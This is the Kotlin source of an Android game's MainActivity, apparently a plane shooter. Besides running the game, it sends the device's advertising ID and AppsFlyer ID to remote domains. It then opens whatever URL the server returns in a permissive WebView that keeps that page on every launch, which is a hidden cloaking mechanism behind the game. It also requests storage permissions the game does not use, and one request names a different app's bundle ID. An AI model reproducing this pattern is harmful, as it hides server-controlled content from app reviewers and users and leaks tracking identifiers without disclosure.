package com.flavo_oculus.air_force

import android.app.Activity
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.AsyncTask
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.RemoteException
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerLib
import com.flavo_oculus.air_force.game.GameView
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.onEach
import java.io.IOException
import java.util.*

class MainActivity : AppCompatActivity() {
    var current_score: String? = null
    var degree = 0
    var degree_old = 0
    var intValue = 0
    var r: Random? = null
    var score = 0

    private var gameView: GameView? = null

    private var gaid = ""

    var sharedPrefEditor: SharedPreferences.Editor? = null
    private lateinit var sharedPreferences: SharedPreferences
    private var webView: WebView? = null
    private lateinit var referrerClient: InstallReferrerClient
    private var referrer = ""
    private lateinit var tvPredictionText: TextView
    private var subParameter = ""
    private var testSubParameter = "i1sj6dwxFtFM^subid1"
    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {

        }
    var filePath: ValueCallback<Array<Uri>>? = null

    val getFile = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (it.resultCode == Activity.RESULT_CANCELED) {
            filePath?.onReceiveValue(null)
        } else if (it.resultCode == Activity.RESULT_OK && filePath != null) {
            filePath!!.onReceiveValue(
                WebChromeClient.FileChooserParams.parseResult(it.resultCode, it.data)
            )
            filePath = null
        }
    }
    private var viewClickedTimes = 0

    private var needExitApp = false

    private val permissionsList = listOf(
        android.Manifest.permission.POST_NOTIFICATIONS,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE
    )


    override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        determineAdvertisingInfo(this)
        setContentView(R.layout.activity_main)
        getNotificationToken()
        sharedPreferences = getSharedPreferences(PREFS, 0)
        sharedPrefEditor = sharedPreferences.edit()
        initViews()

        (application as AirForceApp).conversionData.onEach { subId1 ->
            if (subId1 != null && subId1 is String && subId1.isNotEmpty()) {
                manageUILogic(subId1 = subId1)
            }
        }.launchIn(CoroutineScope(Dispatchers.Main))

        initInstallReferrer()
        requestPermission(permissionsList)
        //        this.current_score = currentNumber(360 - (this.degree % 360));
        r = Random()
        gameView = findViewById(R.id.game_view)
        //0:combatAircraft
        //1:explosion
        //2:yellowBullet
        //3:blueBullet
        //4:smallEnemyPlane
        //5:middleEnemyPlane
        //6:bigEnemyPlane
        //7:bombAward
        //8:bulletAward
        //9:pause1
        //10:pause2
        //11:bomb
        //0:combatAircraft
        //1:explosion
        //2:yellowBullet
        //3:blueBullet
        //4:smallEnemyPlane
        //5:middleEnemyPlane
        //6:bigEnemyPlane
        //7:bombAward
        //8:bulletAward
        //9:pause1
        //10:pause2
        //11:bomb
        val bitmapIds = intArrayOf(
            R.drawable.plane,
            R.drawable.explosion,
            R.drawable.yellow_bullet,
            R.drawable.blue_bullet,
            R.drawable.small,
            R.drawable.middle,
            R.drawable.big,
            R.drawable.bomb_award,
            R.drawable.bullet_award,
            R.drawable.pause1,
            R.drawable.pause2,
            R.drawable.bomb
        )
        gameView?.start(bitmapIds)

    }

    private fun determineAdvertisingInfo(context: Context) {
        AsyncTask.execute {
            try {
                val advertisingIdInfo: com.google.android.gms.ads.identifier.AdvertisingIdClient.Info =
                    com.google.android.gms.ads.identifier.AdvertisingIdClient.getAdvertisingIdInfo(
                        context
                    )
                // You should check this in case the user disabled it from settings
                if (!advertisingIdInfo.isLimitAdTrackingEnabled()) {
                    gaid = if (advertisingIdInfo.id != null) {
                        advertisingIdInfo.id!!
                    } else {
                        ""
                    }
                    Log.d("MY_APP_TAG", "determineAdvertisingInfo gaid: $gaid")
                    // getUserAttributes(id);
                } else {
                    //If you stored the id you should remove it
                }
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: GooglePlayServicesNotAvailableException) {
                e.printStackTrace()
            } catch (e: GooglePlayServicesRepairableException) {
                e.printStackTrace()
            }
        }
    }

    override fun onPause() {
        super.onPause()
        if (gameView != null) {
            gameView?.pause()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (gameView != null) {
            gameView?.destroy()
        }
        gameView = null
    }

    private fun manageUILogic(subId1: String, advertisingId: String = gaid) {
        val appsflyerUserId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        val isFirstRun = sharedPreferences.getBoolean("isFirstRun", true)
        val isFromNotification: Boolean =
            intent.extras?.getBoolean("is_from_notification", false) ?: false
        if (isFromNotification) {
            val url = sharedPreferences.getString(WEB_VEW_URL, "")
            if (url.isNullOrEmpty()) {
                if (subId1.isNotEmpty() && subId1 != "null") {
                    val queue = Volley.newRequestQueue(this)
                    val stringRequest = StringRequest(
                        Request.Method.GET,
                        "https://moluben.es//click?ecid=&bundle_id=com.flavo_oculus.air_force&subid1=$subId1&appsflyer_id=$appsflyerUserId&advertising_id=$advertisingId",
                        { response ->
                            // Display the first 500 characters of the response string.
                            Log.d("STRING_RESPONSE", response)
                            if (response.isNotEmpty()) {
                                sharedPrefEditor?.putString(WEB_VEW_URL, response)?.commit()
                                webView?.visibility = View.VISIBLE
                                webView?.loadUrl(response)
                            }
                            sharedPrefEditor?.putBoolean("isFirstRun", false)?.commit()
                        },
                        { })
                    queue.add(stringRequest)
                }
            } else {
                webView?.visibility = View.VISIBLE
                webView?.loadUrl(url)
            }
            return
        }
        if (isFirstRun) {
            if (subId1.isNotEmpty() && subId1 != "null") {
                val queue = Volley.newRequestQueue(this)
                val stringRequest = StringRequest(
                    Request.Method.GET,
                    "https://yhuqaaetu.vn.ua//click?ecid=&bundle_id=com.sibertas.egyptpower&subid1=$subId1&appsflyer_id=$appsflyerUserId&advertising_id=$advertisingId",
                    { response ->
                        // Display the first 500 characters of the response string.
                        Log.d("STRING_RESPONSE", response)
                        if (response.isNotEmpty()) {
                            sharedPrefEditor?.putString(WEB_VEW_URL, response)?.commit()
                            webView?.visibility = View.VISIBLE
                            webView?.loadUrl(response)
                        }
                        sharedPrefEditor?.putBoolean("isFirstRun", false)?.commit()
                    },
                    { })
                queue.add(stringRequest)
            }
        } else {
            val url = sharedPreferences.getString(WEB_VEW_URL, "")
            if (url.isNullOrEmpty()) {
                webView?.visibility = View.INVISIBLE
            } else {
                webView?.visibility = View.VISIBLE
                webView?.loadUrl(url)
            }
        }
    }
    private fun initViews() {
        webView = findViewById(R.id.web_view)
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        webView?.settings?.let { settings ->
            with(settings) {
                javaScriptEnabled = true
                databaseEnabled = true
                domStorageEnabled = true
                loadsImagesAutomatically = true
                setSupportMultipleWindows(true)
                allowFileAccess = true
                allowContentAccess = true
                allowFileAccessFromFileURLs = true
                javaScriptCanOpenWindowsAutomatically = true

            }
        }

        webView?.webChromeClient = AirForceWebViewClient(this)
        webView?.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                view?.loadUrl(request?.url.toString())
                return false
            }
        }
    }

    private fun initInstallReferrer() {
        referrerClient = InstallReferrerClient.newBuilder(this).build()

        // on below line we are starting its connection.

        // on below line we are starting its connection.
        referrerClient.startConnection(object : InstallReferrerStateListener {
            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                when (responseCode) {
                    InstallReferrerClient.InstallReferrerResponse.OK -> {
                        var response: ReferrerDetails? = null
                        try {
                            response = referrerClient.installReferrer
                            response.installReferrer
                            val referrerUrl = response.installReferrer
                            subParameter = referrerUrl
//                            manageUILogic(subParameter)
                        } catch (e: RemoteException) {
                            // handling error case.
                            e.printStackTrace()
                        }
                    }
                    InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED -> {
                        // API not available on the current Play Store app.
                        Toast.makeText(
                            this@MainActivity,
                            "Feature not supported..",
                            Toast.LENGTH_SHORT
                        ).show()
//                        manageUILogic(testSubParameter)
                    }
                    InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE ->                         // Connection couldn't be established.
                        Toast.makeText(
                            this@MainActivity,
                            "Fail to establish connection",
                            Toast.LENGTH_SHORT
                        ).show()
                }
            }

            override fun onInstallReferrerServiceDisconnected() {
                // Try to restart the connection on the next request to
                // Google Play by calling the startConnection() method.
                Toast.makeText(this@MainActivity, "Service disconnected..", Toast.LENGTH_SHORT)
                    .show()
            }
        })
    }

    override fun onStart() {
        super.onStart()
        intValue = intent.getIntExtra("INT", 0)
    }

    override fun onBackPressed() {

        webView?.let { wv ->
            if (wv.canGoBack()) {
                wv.goBack()
                return
            } else {
                if (needExitApp) {
                    super.onBackPressed()
                } else {
                    Toast.makeText(
                        this,
                        "Click Back one more time\nto exit the application",
                        Toast.LENGTH_SHORT
                    ).show()
                    needExitApp = true
                }
            }
        }
    }

    private fun requestPermission(permissionsList: List<String>) {
        val newPermissions = mutableListOf<String>()
        permissionsList.forEach { permission ->
            if (ContextCompat.checkSelfPermission(
                    this,
                    permission
                ) == PackageManager.PERMISSION_DENIED
            ) {
                newPermissions.add(permission)
            }
        }
        if (newPermissions.isNotEmpty()) {
            requestPermissionLauncher.launch(newPermissions.toTypedArray())
        }
    }

    private fun getNotificationToken() {
        FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
            if (!task.isSuccessful) {
                Log.w(
                    MainActivity::class.simpleName,
                    "Fetching FCM registration token failed",
                    task.exception
                )
                return@OnCompleteListener
            }
            val token = task.result
            Log.d(MainActivity::class.simpleName, token)
        })
    }

    companion object {
        private const val PREFS = "your_prefs"
        private const val WEB_VEW_URL = "WEB_VEW_URL"
    }
}